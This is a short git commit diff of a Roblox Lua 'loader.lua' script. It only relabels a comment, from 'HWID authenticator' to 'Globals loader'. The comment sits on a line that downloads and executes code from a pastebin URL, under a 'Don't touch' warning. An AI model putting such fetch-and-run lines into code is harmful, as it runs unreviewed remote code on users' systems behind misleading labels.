1ff15ac6b4e41661b4689e13914e5ee2bc2b449c
Harvox <134923684+Harvox@users.noreply.github.com>
2024-12-14 11:20:13 -0500

    Update loader.lua

--- loader.lua
+++ loader.lua
@@ -12,5 +12,5 @@ end
 
 -- Don't touch or it'll break the script
 task.delay(1, function()
-loadstring(game:HttpGet("https://pastebin.com/raw/a2CV7cAg"))() -- HWID authenticator
+loadstring(game:HttpGet("https://pastebin.com/raw/a2CV7cAg"))() -- Globals loader
 end
